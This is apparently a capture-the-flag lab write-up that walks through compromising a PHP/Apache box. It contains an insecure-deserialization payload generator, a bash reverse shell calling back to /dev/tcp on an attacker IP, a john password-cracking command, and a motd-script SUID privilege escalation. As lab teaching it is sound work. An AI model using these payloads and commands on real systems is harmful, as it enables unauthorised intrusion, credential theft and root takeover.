## 🛠️ Actions Taken  

### Port and Service Enumeration  

```
nmap -A -p- 10.10.253.220
```

| Port    | Service  | Description                    |
|---------|----------|--------------------------------|
| 22 | ssh    | OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)|                 |
| 80 | http     | Apache httpd 2.4.18                  |  

### Directory Enumeration  

```
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://10.10.253.220/
```

→ Found following directories  
  - /grid
  - /backup
  - /javascript
  - /javascripts  

### Insecure Deserialization

→ Upon visiting "/backup" found an interesting file called **index.php.bak**. There was some php code in the file.  

```php
<?php

class FormSubmit {

public $form_file = 'message.txt';
public $message = '';

public function SaveMessage() {

$NameArea = $_GET['name']; 
$EmailArea = $_GET['email'];
$TextArea = $_GET['comments'];

	$this-> message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";

}

public function __destruct() {

file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);
echo 'Your submission has been successfully saved!';

}

}

// Leaving this for now... only for debug purposes... do not touch!

$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);

$application = new FormSubmit;
$application -> SaveMessage();


?>
```

→ Upon analyzing the following code   
  ```php
  $debug = $_GET['debug'] ?? '';
  $messageDebug = unserialize($debug);
  ```
  - The value in "debug" parameter is serialized and it is unserialized before getting stored in "$messageDebug".  

  - The presence of php magic function "__destruct()" which is writing the file "form_file" in "/". (The name of the file is "message.txt").   
  ```php
  public function __destruct() {

  file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);
  echo 'Your submission has been successfully saved!';
  
  }
  ```

     

  - This strongly points to insecure deserialization since value in "debug" is user controlled and php magic function is also present.  

→ Confirming insecure deserialization   
  - Creating a script to craft an url encoded serialized object.  
  ```php
  <?php

  class FormSubmit
  {
    public $form_file = "pwned.txt";
    public $message    = "Testing insecure deserialization";
  }
  $payload = new FormSubmit();
  $serialized = serialize($payload);
  $encoded = urlencode($serialized);
  echo "$encoded\n";
  ?>
  ```
  - Injected the output in "http://10.10.253.220/index.php/?debug="  

  - Doing curl on "http://10.10.253.220/pwned.txt" returns "Testing insecure deserialization" which confirms insecure deserialization.  


### Exploitation  

→ Crafting a reverse shell using the same script as above. 
  ```php
  <?php


class FormSubmit{

	public $form_file="shell.php";
	public $message ="<?php system('bash -c \"bash -i >& /dev/tcp/10.10.123.254/4444 0>&1\"'); ?>"; 

}

$payload = new FormSubmit();



$serialized = serialize($payload);

$encoded = urlencode($serialized);



echo "$encoded\n";
```

→ Started a listener on local machine and visited "http"//10.10.253.220/shell.php" and received a reverse shell and stabilized it.  


### Post Exploitation   

→ Got access as user "www-data".  
→ Found a file named ".htpasswd" in "/var/www/html" directory.  
→ File contained a username "james" and it's password hash.  

### Privilege Escalation  

→ Horizontal Privilege Escalation      
  - Copied the hash to a file named "password.hash"  
  - Using john cracked the password hash  
    ```
    john password.hash --wordlist=/usr/share/wordlists/rockyou.txt
    ```

  - Used the cracked password "jamaica" to ssh as james.     
  - Found user flag in /home/james directory.  
  - Found a file "Note-to-James.txt" in same directory.  
  - The file mentioned admin giving special permission to james to modify ssh messages.  

→ Escalation to root  
  - Read the ".bash_histroy" and found reference for "/etc/update-motd.d/"  
  - Visited the mentioned directory and found  
    - The files were created/owned by root   
    - But group james is granted collaborative access (read/write/execute) which is evident from previously found note.  
  - Added the following entry in the "/etc/update-motd.d/00-header"  
    ```bash
    echo "cp /bin/bash /home/james/bash && chmod u+s /home/james/bash" >> /etc/update-motd.d/00-header
    ```
  - Logged out from ssh.  
  - Logged in again via ssh and executed "./bash -p" which resulted in a root shell.  
  - Obtained the root flag.  



## 🔍 Key Findings  

- Insecure Deserialization which lead to arbitrary code injection.
- Credentials lying in the ".htpasswd" file.
- Special permissons granted to the user "james" to read/write the files owned by root.


## 📚 What I Learned  

- Insecure Deserialization can be dangerous as it allows an attacker to inject malicious payloads.
- Not to put credentials and other crucial information in files which are can be accessed easily.
